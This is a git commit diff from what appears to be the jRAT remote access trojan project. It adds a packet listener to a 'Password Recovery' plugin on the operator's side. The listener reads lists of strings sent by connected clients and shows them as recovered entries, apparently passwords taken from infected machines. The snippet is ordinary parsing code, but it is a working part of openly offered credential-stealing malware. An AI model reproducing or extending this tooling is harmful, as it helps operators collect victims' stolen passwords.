fdf7803379ff22a36f4de80a329931f29e721787
redpois0n <red@cmail.nu>
2015-10-29 11:37:11 +0100

    incoming controller packet complete

--- Plugin Password Recovery Client/src/jrat/plugin/recovery/client/EntryPacketListener.java
+++ Plugin Password Recovery Client/src/jrat/plugin/recovery/client/EntryPacketListener.java
@@ -7,7 +7,21 @@ public class EntryPacketListener extends PacketListener {
 
 	@Override
 	public void perform(Client client) {
-		
+		try {
+			int len = client.getDataInputStream().readByte();
+			
+			String[] data = new String[len];
+			
+			for (int i = 0; i < len; i++) {
+				data[i] = client.readString();
+			}
+			
+			if (FrameRecovery.INSTANCE != null) {
+				FrameRecovery.INSTANCE.addEntry(client, data);
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 
 }
